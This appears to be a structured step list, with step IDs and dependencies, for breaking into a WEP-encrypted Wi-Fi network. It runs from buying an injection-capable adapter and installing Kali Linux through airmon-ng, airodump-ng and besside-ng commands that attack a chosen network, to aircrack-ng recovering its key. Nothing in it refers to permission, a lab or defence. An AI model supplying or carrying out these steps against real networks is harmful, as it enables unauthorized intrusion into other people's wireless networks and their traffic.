1. [step: WH-4401-01] Purchase a network adapter that supports monitor mode and packet injection. requires: none
2. [step: WH-4401-02] Install Kali Linux on your computer. requires: 01
3. [step: WH-4401-03] Connect your network adapter and boot into Kali Linux. requires: 02
4. [step: WH-4401-04] Open the Terminal. requires: 03
5. [step: WH-4401-05] Type ifconfig and press enter to find your network adapter name. requires: 04
6. [step: WH-4401-06] Type " airmon-ng start [network adapter name]" and press Enter to put the network adapter in monitor mode. requires: 05
7. [step: WH-4401-07] Type "airodump-ng [network adapter name] --encrypt WEP" to find the network BSSID and channel number. requires: 06
8. [step: WH-4401-08] Type "besside-ng -c [channel number] -b [BSSID number] [network adapter name]" and press Enter to attack the network. requires: 07
9. [step: WH-4401-09] Type "aircrack-ng ./wep.cap" and press "Enter' to see a list of networks. requires: 08
10. [step: WH-4401-10] Select the number you want to break to find out the network key. requires: 09
